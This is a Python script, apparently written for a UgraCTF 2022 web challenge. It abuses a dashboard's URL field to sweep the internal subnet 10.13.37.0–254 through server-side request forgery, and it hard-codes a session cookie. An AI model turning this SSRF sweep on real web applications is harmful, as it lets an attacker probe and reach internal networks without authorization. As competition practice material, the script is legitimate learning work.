import requests

headers = {
    'authority': 'webdept.q.2022.ugractf.ru',
    'cache-control': 'max-age=0',
    'upgrade-insecure-requests': '1',
    'origin': 'https://webdept.q.2022.ugractf.ru',
    'content-type': 'application/x-www-form-urlencoded',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'sec-gpc': '1',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-user': '?1',
    'sec-fetch-dest': 'document',
    'referer': 'https://webdept.q.2022.ugractf.ru/2238d2cb7745d8b713a0a67b8d803415/dashboard',
    'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
    'cookie': 'AIOHTTP_SESSION="gAAAAABiHNfPGrTIV3GhD0RpcjDr_SYkRyfHkmKwhEgUtpis-nNbuC0jK-95dyr3i183j90qHErJL1onxWddJR7YS054HIU30rpbMyXAXUYCbyNEVl9aE_c6TyiCOud2hBMGTLGgB3VwmZQVEtLSGDeQG0nzeELvlw=="',
}

for i in range(255):
    data = {
        'url': f'http://10.13.37.{i}'
    }

    response = requests.post('https://webdept.q.2022.ugractf.ru/2238d2cb7745d8b713a0a67b8d803415/dashboard', headers=headers, data=data)
    print(data['url'], response.status_code)
    if response.status_code not in [502, 503]:
        print(response.text)
